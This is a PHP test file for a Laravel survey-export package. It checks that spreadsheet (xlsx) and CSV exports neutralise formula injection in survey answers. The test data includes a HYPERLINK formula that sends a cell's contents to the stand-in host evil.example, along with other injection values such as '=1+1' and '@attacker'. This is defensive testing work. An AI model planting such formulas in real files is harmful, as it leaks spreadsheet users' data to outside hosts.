<?php

use Illuminate\Support\Facades\Storage;
use Maatwebsite\Excel\Concerns\FromArray;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Statikbe\Surveyhero\Exports\Sheets\ResponsesSheet;
use Statikbe\Surveyhero\Exports\SurveyExport;
use Statikbe\Surveyhero\Models\Survey;
use Statikbe\Surveyhero\Models\SurveyAnswer;
use Statikbe\Surveyhero\Models\SurveyQuestion;
use Statikbe\Surveyhero\Models\SurveyQuestionResponse;
use Statikbe\Surveyhero\Models\SurveyResponse;

const EVIL_HYPERLINK = '=HYPERLINK("https://evil.example/?d="&A2,"x")';

/**
 * One response with four answers: two malicious texts, a normal text and a negative number.
 * Columns: A id, B participant, C phone, D..G question_1..question_4.
 * Only the responses sheet is used: the other sheets rely on JSON_KEYS(), which SQLite lacks.
 */
function makeMaliciousResponseExport(): SurveyExport
{
    $survey = Survey::factory()->create();

    $answers = [
        'question_1' => ['converted_string_value' => EVIL_HYPERLINK, 'converted_int_value' => null],
        'question_2' => ['converted_string_value' => '=1+1', 'converted_int_value' => null],
        'question_3' => ['converted_string_value' => 'Fine answer', 'converted_int_value' => null],
        'question_4' => ['converted_string_value' => null, 'converted_int_value' => -3],
    ];

    $response = SurveyResponse::factory()->for($survey, 'survey')->create([
        'surveyhero_id' => 777,
        'surveyhero_link_parameters' => json_encode(['participant' => '@attacker', 'phone' => '+32 123 45 67']),
    ]);

    foreach ($answers as $field => $values) {
        $question = SurveyQuestion::factory()->for($survey, 'survey')->create(['field' => $field]);
        $answer = SurveyAnswer::factory()->for($question, 'surveyQuestion')->create($values);

        SurveyQuestionResponse::factory()->create([
            'survey_response_id' => $response->id,
            'survey_question_id' => $question->id,
            'survey_answer_id' => $answer->id,
        ]);
    }

    $linkParameters = ['participant', 'phone'];
    $export = new SurveyExport($survey, $linkParameters, []);
    $export->setSheets([new ResponsesSheet($survey, $linkParameters, [])]);

    return $export;
}

it('exports malicious answers and link parameters to xlsx as literal text', function () {
    Storage::fake('local');

    expect(makeMaliciousResponseExport()->store('survey.xlsx', 'local'))->toBeTrue();

    $sheet = IOFactory::load(Storage::disk('local')->path('survey.xlsx'))->getActiveSheet();

    $expected = [
        'B2' => '@attacker',
        'C2' => '+32 123 45 67',
        'D2' => EVIL_HYPERLINK,
        'E2' => '=1+1',
    ];

    foreach ($expected as $coordinate => $text) {
        $cell = $sheet->getCell($coordinate);

        expect($cell->getDataType())->toBe(DataType::TYPE_STRING, $coordinate);
        expect($cell->isFormula())->toBeFalse($coordinate);
        // no visible prefix character in xlsx
        expect($cell->getValue())->toBe($text, $coordinate);
    }
});

it('leaves normal values and numeric columns unchanged in xlsx', function () {
    Storage::fake('local');

    makeMaliciousResponseExport()->store('survey.xlsx', 'local');

    $sheet = IOFactory::load(Storage::disk('local')->path('survey.xlsx'))->getActiveSheet();

    expect($sheet->getCell('A2')->getValue())->toBe(777);
    expect($sheet->getCell('A2')->getDataType())->toBe(DataType::TYPE_NUMERIC);
    expect($sheet->getCell('F2')->getValue())->toBe('Fine answer');
    expect($sheet->getCell('F2')->getDataType())->toBe(DataType::TYPE_STRING);
    expect($sheet->getCell('G2')->getValue())->toBe(-3);
    expect($sheet->getCell('G2')->getDataType())->toBe(DataType::TYPE_NUMERIC);
    expect($sheet->getCell('A1')->getValue())->toBe('surveyhero_response_id');
});

it('prefixes dangerous values with a single quote in csv output only', function () {
    Storage::fake('local');

    makeMaliciousResponseExport()->store('survey.csv', 'local');

    $rows = array_map('str_getcsv', file(Storage::disk('local')->path('survey.csv'), FILE_IGNORE_NEW_LINES));

    expect($rows[1])->toBe(['777', "'@attacker", "'+32 123 45 67", "'".EVIL_HYPERLINK, "'=1+1", 'Fine answer', '-3']);
});

it('does not leak the csv prefix into a later xlsx export of the same object', function () {
    Storage::fake('local');

    $export = makeMaliciousResponseExport();
    $export->store('survey.csv', 'local');
    $export->store('survey.xlsx', 'local');

    $sheet = IOFactory::load(Storage::disk('local')->path('survey.xlsx'))->getActiveSheet();

    expect($sheet->getCell('E2')->getValue())->toBe('=1+1');
});

it('protects custom sheets that do not implement the value binder concern', function () {
    Storage::fake('local');

    $export = makeMaliciousResponseExport();
    $export->setSheets([new class implements FromArray
    {
        public function array(): array
        {
            return [['=1+1', 'ok']];
        }
    }]);
    $export->store('custom.xlsx', 'local');

    $cell = IOFactory::load(Storage::disk('local')->path('custom.xlsx'))->getActiveSheet()->getCell('A1');

    expect($cell->getDataType())->toBe(DataType::TYPE_STRING);
    expect($cell->isFormula())->toBeFalse();
    expect($cell->getValue())->toBe('=1+1');
});
